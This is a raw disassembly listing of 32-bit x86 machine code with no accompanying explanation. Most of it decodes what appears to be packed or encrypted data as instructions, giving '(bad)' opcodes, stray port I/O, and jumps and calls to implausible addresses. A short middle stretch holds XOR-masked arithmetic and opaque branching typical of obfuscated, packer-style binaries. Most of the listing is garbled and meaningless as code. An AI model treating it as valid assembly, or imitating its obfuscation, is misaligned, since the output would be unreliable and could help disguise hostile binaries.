  418c07:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  418c09:	aaa    
  418c0a:	rcl    BYTE PTR [esi+ebp*1-0x4a],cl
  418c0e:	in     eax,0x4e
  418c10:	adc    bh,dh
  418c12:	mov    gs,WORD PTR [ebp-0x4e]
  418c15:	fwait
  418c16:	neg    esp
  418c18:	arpl   WORD PTR [ecx+0x15b8a808],bp
  418c1e:	xor    edi,esi
  418c20:	inc    ebp
  418c21:	lock ret 
  418c23:	dec    eax
  418c24:	xor    BYTE PTR [esi],cl
  418c26:	sbb    edi,eax
  418c28:	inc    BYTE PTR [ebp-0x68]
  418c2b:	clc    
  418c2c:	add    ecx,ebx
  418c2e:	cli    
  418c2f:	dec    ebp
  418c30:	arpl   WORD PTR [ebp+edi*2+0x39],dx
  418c34:	push   ebx
  418c35:	mov    ch,0xef
  418c37:	xchg   ebp,eax
  418c38:	xchg   edx,eax
  418c39:	dec    ebx
  418c3a:	dec    eax
  418c3b:	and    eax,0xf770c66f
  418c40:	test   eax,edi
  418c42:	inc    esi
  418c43:	stc    
  418c44:	test   eax,0xdd5f2a8c
  418c49:	in     al,dx
  418c4a:	push   esp
  418c4b:	shr    cl,cl
  418c4d:	addr16 inc ecx
  418c4f:	lds    edx,FWORD PTR [edi+0xb0a00fa]
  418c55:	xchg   ebp,eax
  418c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c57:	hlt    
  418c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c59:	pop    es
  418c5a:	(bad)  
  418c5b:	outs   dx,BYTE PTR ds:[esi]
  418c5c:	or     esp,DWORD PTR [esi+0x61]
  418c5f:	jmp    0x418c8b
  418c61:	sbb    DWORD PTR [ebp-0x79],ebp
  418c64:	add    esi,ebx
  418c66:	or     DWORD PTR [eax],ebp
  418c68:	lods   eax,DWORD PTR ds:[esi]
  418c69:	cmp    al,0xd5
  418c6b:	push   edi
  418c6c:	pushf  
  418c6d:	pusha  
  418c6e:	dec    ebp
  418c6f:	fisub  DWORD PTR [esi-0x37fe4bba]
  418c75:	push   ds
  418c76:	int    0x75
  418c78:	xor    al,0xfb
  418c7a:	jnp    0x418cee
  418c7c:	pusha  
  418c7d:	jmp    0x158e:0x979c5b8e
  418c84:	stc    
  418c85:	jge    0x418c0e
  418c87:	shl    BYTE PTR [esp+ecx*8+0x2b740007],cl
  418c8e:	ret    0x59fe
  418c91:	push   edi
  418c92:	mov    eax,0x1bd1ab06
  418c97:	icebp  
  418c98:	int    0x4b
  418c9a:	nop
  418c9b:	adc    BYTE PTR [ebp+0xdf2b53f],0xe0
  418ca2:	inc    ecx
  418ca3:	das    
  418ca4:	sub    eax,0x1d49e2d2
  418ca9:	outs   dx,BYTE PTR ds:[esi]
  418caa:	ror    BYTE PTR [eax+edx*1],cl
  418cad:	pop    esp
  418cae:	repnz ss mov ah,ch
  418cb2:	les    esi,FWORD PTR [esi+edi*1-0x71393092]
  418cb9:	popa   
  418cba:	mov    ch,0x99
  418cbc:	std    
  418cbd:	cdq    
  418cbe:	stos   BYTE PTR es:[edi],al
  418cbf:	adc    dh,BYTE PTR [edx+0x3]
  418cc2:	stc    
  418cc3:	dec    esi
  418cc4:	aaa    
  418cc5:	adc    ecx,DWORD PTR [eax]
  418cc7:	pop    esi
  418cc8:	xchg   ecx,eax
  418cc9:	(bad)  
  418cca:	mov    edx,0x6b84b4f6
  418ccf:	mov    esi,0x3347f08c
  418cd4:	mov    ds:0x5e767e66,eax
  418cd9:	mov    al,ds:0xe7b46b2b
  418cde:	(bad)  
  418cdf:	mov    edi,0x6fc003d4
  418ce4:	btr    DWORD PTR [edi+0x171781a7],ecx
  418ceb:	lds    esp,FWORD PTR [ebp-0x4b0f93a9]
  418cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cf2:	dec    esp
  418cf3:	pop    es
  418cf4:	push   ecx
  418cf5:	sbb    DWORD PTR [ebx],0x4c151245
  418cfb:	adc    DWORD PTR [ebx-0x423798e3],esp
  418d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d02:	xchg   esi,eax
  418d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d04:	shl    DWORD PTR [eax+0x3e4a5d2c],1
  418d0a:	stos   DWORD PTR es:[edi],eax
  418d0b:	jae    0x418d78
  418d0d:	cmp    dl,BYTE PTR [ebx+ebx*8-0x52]
  418d11:	adc    ebx,DWORD PTR [eax-0x2c322a26]
  418d17:	cld    
  418d18:	xor    cl,BYTE PTR [edx]
  418d1a:	jmp    0x57599ef8
  418d1f:	and    DWORD PTR [edi-0x17],ebp
  418d22:	mov    ds:0xe8a7b478,al
  418d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d28:	(bad)  [eax+0x2fb94317]
  418d2e:	adc    BYTE PTR [eax+0x719d2798],ah
  418d34:	retf   0xa606
  418d37:	jmp    0x418cdf
  418d39:	mov    DWORD PTR [esi-0x4f],ebp
  418d3c:	dec    esi
  418d3d:	(bad)  
  418d3e:	ins    DWORD PTR es:[edi],dx
  418d3f:	mov    ecx,0x7d41941b
  418d44:	inc    edi
  418d45:	popa   
  418d46:	lea    esp,[eax+0x74909069]
  418d4c:	push   edx
  418d4d:	push   ecx
  418d4e:	int    0x41
  418d50:	std    
  418d51:	into   
  418d52:	pop    ds
  418d53:	mov    ds:0x5ace9b76,eax
  418d58:	mov    cl,0x72
  418d5a:	arpl   WORD PTR [ecx-0x20],di
  418d5d:	push   ebx
  418d5e:	loope  0x418db1
  418d60:	pop    ebx
  418d61:	lock xchg edi,eax
  418d63:	sbb    DWORD PTR [eax],0x22b59a96
  418d69:	push   ebp
  418d6a:	out    dx,al
  418d6b:	cmp    eax,0x9e085834
  418d70:	and    ecx,DWORD PTR ds:0x3adb62ab
  418d76:	jb     0x418d36
  418d78:	mov    bl,0x85
  418d7a:	call   0x15fe815d
  418d7f:	mov    eax,ds:0x77157292
  418d84:	mov    ch,BYTE PTR [edi+ecx*4-0x395fa263]
  418d8b:	pop    es
  418d8c:	cmp    DWORD PTR [edi+0x34],eax
  418d8f:	sbb    bh,BYTE PTR [edx]
  418d91:	int    0x64
  418d93:	and    esi,DWORD PTR [edi+edi*4+0x458316ed]
  418d9a:	fiadd  WORD PTR [ebx+0x5956bdce]
  418da0:	std    
  418da1:	mov    edx,0x52e4dff9
  418da6:	mov    WORD PTR [esi-0x11902f98],gs
  418dac:	aad    0x5e
  418dae:	addr16 retf 0xa8c
  418db2:	push   cs
  418db3:	push   ebp
  418db4:	jge    0x418d6c
  418db6:	mov    ebp,0x7fff15f7
  418dbb:	dec    ebx
  418dbc:	iret   
  418dbd:	sub    al,0x62
  418dbf:	jecxz  0x418daa
  418dc1:	xchg   BYTE PTR [ecx],ch
  418dc3:	jo     0x418d4a
  418dc5:	int3   
  418dc6:	out    0xde,al
  418dc8:	test   al,0x25
  418dca:	sar    BYTE PTR [ecx+0x10],1
  418dcd:	imul   esi,ebx,0xfe736f88
  418dd3:	dec    edx
  418dd4:	or     DWORD PTR [esi+ebx*4+0x704e2147],edx
  418ddb:	popa   
  418ddc:	retf   
  418ddd:	mov    al,0x2b
  418ddf:	sti    
  418de0:	sbb    DWORD PTR ds:[esi+0x4e],edx
  418de4:	dec    ebx
  418de5:	adc    al,dl
  418de7:	xlat   BYTE PTR ds:[ebx]
  418de8:	or     BYTE PTR [eax],0x88
  418deb:	fs data16 mov dl,0x25
  418def:	pop    esi
  418df0:	cmp    DWORD PTR [edx+0x16],ecx
  418df3:	(bad)  
  418df4:	std    
  418df5:	pop    edi
  418df6:	in     al,0xc3
  418df8:	lea    esi,[edi+0x5a]
  418dfb:	mov    ds:0xca14d22b,eax
  418e00:	lahf   
  418e01:	int3   
  418e02:	inc    esp
  418e03:	sbb    ebx,DWORD PTR [esi+0x33fc4ebb]
  418e09:	in     al,dx
  418e0a:	dec    edi
  418e0b:	fcomi  st,st(4)
  418e0d:	jmp    0x20bc4f7a
  418e12:	jmp    0x418de2
  418e14:	into   
  418e15:	mov    ebx,eax
  418e17:	mov    al,ds:0xd7619240
  418e1c:	xchg   BYTE PTR [edx],al
  418e1e:	push   esp
  418e1f:	dec    esp
  418e20:	addr16 xchg ebx,eax
  418e22:	(bad)  
  418e23:	cmp    DWORD PTR [ecx+0x1c82e32d],ebp
  418e29:	ficomp DWORD PTR [esi-0x9]
  418e2c:	pop    edi
  418e2d:	stc    
  418e2e:	push   cs
  418e2f:	mov    ds:0xddd8f751,eax
  418e34:	mov    al,0xb3
  418e36:	push   0x15
  418e38:	shl    bl,0xe9
  418e3b:	(bad)  
  418e3c:	mov    ch,0x40
  418e3e:	and    edx,DWORD PTR [ebp-0x6e94041f]
  418e44:	ds inc ebx
  418e46:	iret   
  418e47:	mov    dh,0x6
  418e49:	cmp    BYTE PTR [edx+0x17344476],0xe8
  418e50:	cmp    bh,dl
  418e52:	repnz mov eax,ds:0x632e9e4c
  418e58:	(bad)  
  418e59:	in     eax,0xae
  418e5b:	fisttp WORD PTR [edx-0x7a]
  418e5e:	add    edx,DWORD PTR [edi-0x4f]
  418e61:	add    bh,dh
  418e63:	xor    BYTE PTR [edx-0x743573a5],0x68
  418e6a:	sahf   
  418e6b:	dec    esi
  418e6c:	nop
  418e6d:	dec    ecx
  418e6e:	pop    esp
  418e6f:	test   DWORD PTR [edx-0x63ad949],ecx
  418e75:	mov    edi,0xb109f40d
  418e7a:	jp     0x418e1c
  418e7c:	or     DWORD PTR [esi+ecx*4],edi
  418e7f:	iret   
  418e80:	jmp    0x418e04
  418e82:	adc    BYTE PTR [edi],dl
  418e84:	cdq    
  418e85:	mov    cl,0xbc
  418e87:	and    al,0x3e
  418e89:	ror    DWORD PTR [edi+0x63c3a05a],cl
  418e8f:	inc    ecx
  418e90:	add    dh,BYTE PTR [edi+0x36f2ebc9]
  418e96:	add    eax,0x10a9ab6
  418e9b:	test   BYTE PTR [ecx+0x46],bh
  418e9e:	inc    esp
  418e9f:	mov    bl,0x2
  418ea1:	fwait
  418ea2:	mov    edx,0xae228d21
  418ea7:	call   0xd0382013
  418eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ead:	cmp    al,0x76
  418eaf:	add    BYTE PTR [ebp+0x36],dl
  418eb2:	jmp    0x3125:0xc3c8dcc1
  418eb9:	(bad)  
  418eba:	mov    ebx,0x9c988eb4
  418ebf:	adc    eax,0xfd49a102
  418ec4:	sahf   
  418ec5:	ror    esi,cl
  418ec7:	arpl   WORD PTR [edi+ebx*2],bx
  418eca:	jmp    0x418eff
  418ecc:	xchg   ecx,eax
  418ecd:	xor    DWORD PTR [edi-0x228fdbca],ebx
  418ed3:	mov    ds:0x4bc43b19,al
  418ed8:	pop    edi
  418ed9:	pop    ss
  418eda:	in     eax,dx
  418edb:	es cmp ch,ch
  418ede:	or     esi,DWORD PTR [edi-0x3a]
  418ee1:	mov    ah,0xd3
  418ee3:	jecxz  0x418eb1
  418ee5:	dec    ebx
  418ee6:	or     DWORD PTR [ebp-0x38],ebp
  418ee9:	ret    0x1bb3
  418eec:	and    DWORD PTR [esi-0x6f],edi
  418eef:	xor    eax,0x37ebe3a1
  418ef4:	xchg   BYTE PTR [eax+0x2d],ch
  418ef7:	es jnp 0x418f11
  418efa:	enter  0x7b41,0xa7
  418efe:	dec    eax
  418eff:	jmp    0xbc9a3e14
  418f04:	lds    ecx,FWORD PTR [ebp+0xc]
  418f07:	add    al,BYTE PTR [eax]
  418f09:	rcr    bl,cl
  418f0b:	lods   eax,DWORD PTR ds:[esi]
  418f0c:	jmp    0x418ed9
  418f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f0f:	mov    edx,0xb6fce46d
  418f14:	(bad)  
  418f15:	adc    ebx,ebp
  418f17:	enter  0xb548,0x6d
  418f1b:	loop   0x418f44
  418f1d:	leave  
  418f1e:	popa   
  418f1f:	outs   dx,DWORD PTR ds:[esi]
  418f20:	sar    BYTE PTR [ecx-0x23],cl
  418f23:	fidivr WORD PTR [edi+0x2f]
  418f26:	cmp    ch,BYTE PTR [esi+0x6f]
  418f29:	adc    BYTE PTR [edx+0x54],dl
  418f2c:	adc    DWORD PTR [esi-0x5f],ebp
  418f2f:	inc    edx
  418f30:	xchg   esi,eax
  418f31:	adc    BYTE PTR ds:[eax-0x383de602],0xb6
  418f39:	sub    dh,BYTE PTR [edx-0x36971f51]
  418f3f:	(bad)  
  418f40:	pop    esi
  418f41:	jo     0x418f23
  418f43:	retf   0x5844
  418f46:	cmc    
  418f47:	dec    ecx
  418f48:	and    BYTE PTR [ecx],dh
  418f4a:	push   esi
  418f4b:	pop    esi
  418f4c:	mov    DWORD PTR [edi+0x8b11836],0x966da44a
  418f56:	arpl   WORD PTR [ebx+0x78d202b7],dx
  418f5c:	jmp    0x48963693
  418f61:	(bad)  
  418f62:	adc    eax,0x9922b7c0
  418f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f68:	call   0xd4e74952
  418f6d:	dec    edi
  418f6e:	push   0xffffffc7
  418f70:	clc    
  418f71:	jl     0x418f61
  418f73:	mov    eax,ds:0xd210e90f
  418f78:	add    edi,DWORD PTR [ecx+0x4e49cb8f]
  418f7e:	sbb    DWORD PTR [edi],ecx
  418f80:	aam    0x5d
  418f82:	cli    
  418f83:	lods   eax,DWORD PTR ds:[esi]
  418f84:	and    BYTE PTR [ebx+0x332611f8],bl
  418f8a:	pop    eax
  418f8b:	jp     0x418fdb
  418f8d:	(bad)  
  418f90:	and    al,0x28
  418f92:	mov    BYTE PTR [ebx],al
  418f94:	hlt    
  418f95:	cld    
  418f96:	inc    esp
  418f97:	xchg   BYTE PTR [esi+edi*2],cl
  418f9a:	outs   dx,DWORD PTR ds:[esi]
  418f9b:	pop    edx
  418f9c:	aas    
  418f9d:	adc    DWORD PTR [ebp-0x41a5e573],ecx
  418fa3:	imul   ebp,DWORD PTR [esi],0x11
  418fa6:	es push esp
  418fa8:	or     ebx,DWORD PTR [ecx]
  418faa:	xlat   BYTE PTR ds:[ebx]
  418fab:	ret    0x1098
  418fae:	(bad)  
  418faf:	loop   0x418f7b
  418fb1:	lds    esi,FWORD PTR [esi-0x76]
  418fb4:	dec    ebx
  418fb5:	xor    DWORD PTR [ebp+0x7ebeb847],esi
  418fbb:	in     al,0xf4
  418fbd:	(bad)  
  418fbe:	mov    ah,ah
  418fc0:	add    ch,BYTE PTR [eax-0x675d1970]
  418fc6:	xchg   edx,eax
  418fc7:	int    0x4f
  418fc9:	and    DWORD PTR [ebx+0x625a8d15],ecx
  418fcf:	mov    ds:0x19d0189b,eax
  418fd4:	mov    edx,0x992157db
  418fd9:	pop    esp
  418fda:	xor    ebp,DWORD PTR [ebx-0xfd8a4d4]
  418fe0:	inc    esi
  418fe1:	mov    bh,BYTE PTR [edx]
  418fe3:	jle    0x419052
  418fe5:	sti    
  418fe6:	mov    ebx,0x5a2b0e23
  418feb:	sbb    BYTE PTR [eax+0x2a82126],dl
  418ff1:	test   eax,0x83876afd
  418ff6:	inc    esi
  418ff7:	arpl   WORD PTR [ecx+0x6b4996df],dx
  418ffd:	xchg   ebp,eax
  418ffe:	dec    ebx
  418fff:	push   ebp
  419000:	mov    cl,0xc
  419002:	sub    DWORD PTR [ebx+0x1f],ebx
  419005:	lock jle 0x418fb2
  419008:	retf   
  419009:	aam    0x1d
  41900b:	mov    bh,0x69
  41900d:	inc    esi
  41900e:	aas    
  41900f:	enter  0xcd69,0x51
  419013:	push   ss
  419014:	shl    dl,1
  419016:	call   0xefe4fc80
  41901b:	mov    ebp,0x33b6ec13
  419020:	push   ebx
  419021:	test   DWORD PTR [edi+edi*2-0x763fdcf1],0x53b33cb2
  41902c:	mov    ecx,0x34323f6b
  419031:	pop    ebx
  419032:	sar    DWORD PTR es:[edi+0x854ad4c],0x1c
  41903a:	adc    bh,BYTE PTR [edi]
  41903c:	xor    eax,0xc0f4d00f
  419041:	dec    eax
  419042:	add    DWORD PTR [ecx+0x47],ecx
  419045:	or     ecx,ebx
  419047:	aas    
  419048:	dec    edx
  419049:	or     BYTE PTR [esp+esi*2-0x19],bh
  41904d:	retf   
  41904e:	cmp    edx,DWORD PTR es:[edi-0x436599a1]
  419055:	adc    ebp,ebp
  419057:	jbe    0x41901b
  419059:	stc    
  41905a:	popa   
  41905b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41905c:	mov    BYTE PTR [esi],al
  41905e:	daa    
  41905f:	push   edx
  419060:	and    ah,0x27
  419063:	rcr    DWORD PTR [esp+esi*8],0x28
  419067:	faddp  st(6),st
  419069:	mov    esp,0x353a3993
  41906e:	pop    eax
  41906f:	push   ebp
  419070:	shr    ah,0x29
  419073:	test   ebx,ebx
  419075:	inc    ebx
  419076:	sbb    DWORD PTR [edi+eax*1-0x14f0c00a],ebp
  41907d:	xor    ecx,ebx
  41907f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419080:	inc    ecx
  419081:	push   ss
  419082:	adc    ecx,edx
  419084:	mov    ah,0xd1
  419086:	dec    ecx
  419087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419088:	out    dx,eax
  419089:	or     ah,bh
  41908b:	mov    ah,0x6c
  41908d:	and    DWORD PTR es:0x24e3c8a7,esi
  419094:	or     BYTE PTR [edx],dh
  419096:	or     dh,al
  419098:	nop
  419099:	pop    ebx
  41909a:	or     eax,esi
  41909c:	add    al,0x59
  41909e:	pop    esi
  41909f:	pusha  
  4190a0:	sbb    eax,0x96b1ab9c
  4190a5:	mov    al,ds:0x105ec9d3
  4190aa:	aaa    
  4190ab:	jecxz  0x419108
  4190ad:	aam    0xa3
  4190af:	sub    DWORD PTR [esi+0x66],ecx
  4190b2:	pop    edx
  4190b3:	jnp    0x4190e5
  4190b5:	das    
  4190b6:	(bad)  
  4190b7:	jmp    0x73b4d02c
  4190bc:	sbb    BYTE PTR [eax+0x1c9ff1af],bh
  4190c2:	outs   dx,DWORD PTR ds:[esi]
  4190c3:	ret    
  4190c4:	aaa    
  4190c5:	and    DWORD PTR [edi],esp
  4190c7:	pop    eax
  4190c8:	jmp    0x419094
  4190ca:	adc    BYTE PTR [edx],0x36
  4190cd:	pop    eax
  4190ce:	scas   al,BYTE PTR es:[edi]
  4190cf:	jmp    0x4190d2
  4190d1:	pop    ebx
  4190d2:	xchg   ebx,eax
  4190d3:	xor    eax,0xb85d4959
  4190d8:	repz jmp 0xba27:0xd4111335
  4190e0:	rol    BYTE PTR [eax+0x5a],0xaa
  4190e4:	mov    dh,0xf4
  4190e6:	push   esi
  4190e7:	leave  
  4190e8:	in     al,dx
  4190e9:	mov    bl,0x3
  4190eb:	inc    eax
  4190ec:	adc    edi,ecx
  4190ee:	inc    eax
  4190ef:	out    0x17,eax
  4190f1:	inc    edx
  4190f2:	mov    esi,0xfa130d0e
  4190f7:	fwait
  4190f8:	out    0x1,eax
  4190fa:	out    0xa6,al
  4190fc:	or     al,0x50
  4190fe:	mov    esp,0xcc831c02
  419103:	ins    DWORD PTR es:[edi],dx
  419104:	mov    ch,BYTE PTR [edx+0x2d]
  419107:	gs pop esp
  419109:	add    eax,0xe6168f2d
  41910e:	stos   BYTE PTR es:[edi],al
  41910f:	mov    ds:0x3b1b1a8b,al
  419114:	gs sbb eax,0xd82d4c4a
  41911a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41911b:	outs   dx,BYTE PTR ds:[esi]
  41911c:	cmp    eax,0x14c71d7e
  419121:	and    al,0xd5
  419123:	mov    al,0xb6
  419125:	sub    DWORD PTR [ebx+0x11],esp
  419128:	cmp    BYTE PTR [ebx],dl
  41912a:	jp     0x41910f
  41912c:	es sbb edi,esp
  41912f:	mov    eax,0xdc0b386a
  419134:	dec    ecx
  419135:	fwait
  419136:	scas   al,BYTE PTR es:[edi]
  419137:	pop    edx
  419138:	jb     0x4190f6
  41913a:	mov    edx,0x79187c75
  41913f:	sub    eax,0x5589374c
  419144:	mov    al,0x8b
  419146:	push   ebp
  419147:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  41914d:	and    edx,ebx
  41914f:	mov    DWORD PTR [ebp-0x4c],edx
  419152:	mov    edx,DWORD PTR [ebp+0x8]
  419155:	mov    ebx,DWORD PTR [ebp-0x48]
  419158:	lea    edx,[ebx+edx*1+0x241fcdf]
  41915f:	mov    DWORD PTR [ebp-0x48],edx
  419162:	mov    edx,DWORD PTR [ebp+0x8]
  419165:	mov    ebx,0xfa5e1524
  41916a:	sub    ebx,edx
  41916c:	add    ebx,DWORD PTR [ebp-0x44]
  41916f:	mov    DWORD PTR [ebp-0x44],ebx
  419172:	mov    edx,DWORD PTR [ebp+0x8]
  419175:	xor    edx,eax
  419177:	add    edx,esi
  419179:	jne    0x416da2
  41917f:	mov    edx,DWORD PTR [ebp-0x8]
  419182:	mov    ebx,DWORD PTR [ebp-0xc]
  419185:	xor    edx,eax
  419187:	lea    edx,[edx+ebx*1+0x3272f5]
  41918e:	mov    DWORD PTR [ebp-0xc],edx
  419191:	mov    edx,DWORD PTR [ebp-0x10]
  419194:	xor    edx,eax
  419196:	add    edx,esi
  419198:	jne    0x4124bd
  41919e:	jmp    0x41b615
  4191a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4191a6:	mov    DWORD PTR [ebp+0x8],ecx
  4191a9:	jmp    0x41b582
  4191ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4191b1:	mov    edx,DWORD PTR [ebp-0x8]
  4191b4:	xor    ecx,eax
  4191b6:	xor    edx,eax
  4191b8:	sub    ecx,edx
  4191ba:	sub    ecx,esi
  4191bc:	xor    ecx,eax
  4191be:	mov    DWORD PTR [ebp+0x8],ecx
  4191c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4191c4:	mov    edx,DWORD PTR [ebp-0x58]
  4191c7:	add    ecx,0x5708e2
  4191cd:	imul   ecx,edx
  4191d0:	mov    DWORD PTR [ebp-0x58],ecx
  4191d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4191d6:	mov    edx,DWORD PTR [ebp-0x54]
  4191d9:	add    ecx,0x64f880
  4191df:	or     ecx,edx
  4191e1:	mov    DWORD PTR [ebp-0x54],ecx
  4191e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4191e7:	mov    edx,DWORD PTR [ebp-0x50]
  4191ea:	add    ecx,0x242ebf1
  4191f0:	xor    ecx,edx
  4191f2:	mov    DWORD PTR [ebp-0x50],ecx
  4191f5:	jmp    0x41b555
  4191fa:	pop    edx
  4191fb:	cmp    al,0xf8
  4191fd:	inc    esp
  4191fe:	xchg   esi,eax
  4191ff:	test   dl,cl
  419201:	and    al,BYTE PTR [edx-0x4508d874]
  419207:	fldenv [edx-0x7fdfcc71]
  41920d:	cmp    DWORD PTR [esi],0x5e
  419210:	add    DWORD PTR [ebx-0x51c46586],0xffffffc9
  419217:	out    0xa4,al
  419219:	dec    ecx
  41921a:	xchg   edx,eax
  41921b:	xchg   ecx,eax
  41921c:	jno    0x4191ee
  41921e:	sbb    DWORD PTR [edi+esi*4],ebx
  419221:	fistp  DWORD PTR ds:0x5981b7c1
  419227:	dec    ebx
  419228:	leave  
  419229:	mov    ds:0xaaa92a20,al
  41922e:	jge    0x419267
  419230:	push   esp
  419231:	daa    
  419232:	dec    esi
  419233:	pop    esi
  419234:	xor    al,0x27
  419236:	dec    eax
  419237:	(bad)  [esi+0x2b]
  41923a:	mov    ds:0xd40c8c87,al
  41923f:	pushf  
  419240:	bound  esp,QWORD PTR [ebp+0x35]
  419243:	mov    esp,0x778eed78
  419248:	mov    ah,0x1e
  41924a:	jl     0x4191d2
  41924c:	jbe    0x4192ac
  41924e:	sub    al,BYTE PTR [ebx+edi*4+0xf4d779e]
  419255:	sub    DWORD PTR [edx-0x25f6dc7a],ecx
  41925b:	sbb    DWORD PTR [edx+0xe0d0db1],ecx
  419261:	mov    dl,0x58
  419263:	nop
  419264:	push   eax
  419265:	pop    ebp
  419266:	jg     0x4192aa
  419268:	div    DWORD PTR [eax+0x2f]
  41926b:	imul   ecx,DWORD PTR [ebp-0x4c],0x47
  41926f:	sbb    al,0xb0
  419271:	jmp    0xa3f500b0
  419276:	mov    eax,0x2b95108c
  41927b:	out    dx,eax
  41927c:	jnp    0x41922b
  41927e:	in     eax,0x85
  419280:	pop    edx
  419281:	pushf  
  419282:	iret   
  419283:	scas   al,BYTE PTR es:[edi]
  419284:	mov    ds:0x748f022d,eax
  419289:	jmp    0x23c2:0xef3cd573
  419290:	js     0x419224
  419292:	gs int 0xb6
  419295:	sbb    DWORD PTR [ebx-0x9],edx
  419298:	xchg   ecx,esp
  41929a:	add    al,BYTE PTR [eax+0x2b]
  41929d:	push   esp
  41929e:	or     DWORD PTR [edi-0x680c0256],ecx
  4192a4:	push   esp
  4192a5:	add    esi,DWORD PTR [ebp-0x47]
  4192a8:	(bad)  
  4192a9:	out    dx,al
  4192aa:	inc    esp
  4192ab:	daa    
  4192ac:	sbb    bl,BYTE PTR [ebx-0x3b8db8ec]
  4192b2:	(bad)  
  4192b3:	cmp    al,0x6
  4192b5:	jl     0x419277
  4192b7:	cdq    
  4192b8:	and    eax,0xd36918ac
  4192bd:	outs   dx,BYTE PTR ds:[esi]
  4192be:	cmp    eax,0x1d2ab770
  4192c3:	xor    al,0x56
  4192c5:	retf   
  4192c6:	and    eax,0xaa631e02
  4192cb:	cli    
  4192cc:	cdq    
  4192cd:	lds    esi,FWORD PTR [ecx-0x7e]
  4192d0:	cld    
  4192d1:	and    ebp,DWORD PTR [esi-0x7a]
  4192d4:	cmp    al,0x83
  4192d6:	frstor [edi-0x49]
  4192d9:	shl    DWORD PTR [ebx+ebp*1],1
  4192dc:	(bad)  
  4192dd:	xor    esp,DWORD PTR [ecx+ebx*4+0x2651c94b]
  4192e4:	cmp    al,0xae
  4192e6:	aam    0x17
  4192e8:	mov    al,ds:0x55afd88a
  4192ed:	std    
  4192ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ef:	mov    edx,0x55216d34
  4192f4:	fwait
  4192f5:	cmp    ch,BYTE PTR [eax+0x0]
  4192f8:	sbb    bh,BYTE PTR [eax]
  4192fa:	call   0x86d6:0x2c5a541d
  419301:	dec    esp
  419302:	dec    ebx
  419303:	sub    BYTE PTR [ecx],ah
  419305:	dec    esi
  419306:	jge    0x419327
  419308:	mov    edx,edi
  41930a:	sar    BYTE PTR [edx+edx*2-0x70],cl
  41930e:	push   eax
  41930f:	dec    esi
  419311:	out    0x18,al
  419313:	je     0x419356
  419315:	push   edi
  419316:	sbb    esp,eax
  419318:	rcl    BYTE PTR [ebp-0x70],0x4b
  41931c:	sbb    ebp,DWORD PTR ds:0x977c0c32
  419322:	push   esp
  419323:	pop    ecx
  419324:	sub    eax,0x7c89c332
  419329:	cmp    ebx,ebp
  41932b:	push   esp
  41932c:	retf   0xed90
  41932f:	(bad)  
  419330:	and    DWORD PTR [edx+0x2c1a666f],eax
  419336:	inc    ebx
  419337:	xchg   DWORD PTR [ebp-0x6e],edi
  41933a:	adc    DWORD PTR [edi+0x2d],ecx
  41933d:	push   edi
  41933e:	pop    ss
  41933f:	pop    esi
  419340:	icebp  
  419341:	loopne 0x41933d
  419343:	test   BYTE PTR [ecx+edx*8],ah
  419346:	cs jl  0x4192d3
  419349:	out    dx,eax
  41934a:	enter  0x5f54,0x23
  41934e:	pop    edx
  41934f:	(bad)  
  419350:	mov    ds:0x5093a1f6,eax
  419355:	add    al,0x32
  419357:	pop    esi
  419358:	sbb    ebx,0xffffff90
  41935b:	dec    edx
  41935c:	add    al,0xda
  41935e:	sbb    ch,BYTE PTR [ecx+0x2bcfd608]
  419364:	pop    eax
  419365:	mov    ebx,0x9a894706
  41936a:	loope  0x419387
  41936c:	xor    BYTE PTR ds:0x30f8a964,0x63
  419373:	imul   esp,DWORD PTR [ebx-0x21],0xffffff98
  419377:	dec    esp
  419378:	cmp    al,0xfd
  41937a:	dec    ebp
  41937b:	(bad)  
  41937c:	adc    edi,DWORD PTR [ebx+0x5]
  41937f:	jecxz  0x4193ce
  419381:	pushf  
  419382:	das    
  419383:	dec    esi
  419384:	or     DWORD PTR [eax],eax
  419386:	pusha  
  419387:	mov    ebx,ss
  419389:	loope  0x4193f1
  41938b:	jbe    0xef2982c6
  419391:	cmp    eax,0x3fe22dbf
  419396:	aas    
  419397:	cmc    
  419398:	pop    esp
  419399:	or     eax,0xb9c57de
  41939e:	mov    al,ds:0xa0198408
  4193a3:	xchg   BYTE PTR [edx+ebx*8],ah
  4193a6:	jo     0x41934c
  4193a8:	enter  0xbf47,0x85
  4193ac:	pop    es
  4193ad:	(bad)  
  4193ae:	adc    BYTE PTR [ebx+0xe],dh
  4193b1:	adc    ebp,esi
  4193b3:	or     al,0xe7
  4193b5:	push   cs
  4193b6:	(bad)  
  4193b7:	ret    
  4193b8:	neg    BYTE PTR es:[ecx+0x66]
  4193bc:	or     edx,ebx
  4193be:	pop    ebx
  4193bf:	adc    ecx,DWORD PTR [esi+edx*1-0x2f195c59]
  4193c6:	(bad)  
  4193c9:	(bad)  
  4193ca:	out    0xbc,eax
  4193cc:	shl    BYTE PTR [edi+0x66],cl
  4193cf:	adc    al,0xe
  4193d1:	cmp    ebx,DWORD PTR [ebp-0x10]
  4193d4:	xchg   edx,eax
  4193d5:	sbb    ch,BYTE PTR [ecx-0x7535bea8]
  4193db:	je     0x419385
  4193dd:	out    dx,eax
  4193de:	adc    edx,eax
  4193e0:	jnp    0x4193d3
  4193e2:	fdiv   QWORD PTR [ebx]
  4193e4:	ds jns 0x419464
  4193e7:	retf   0x7ae0
  4193ea:	leave  
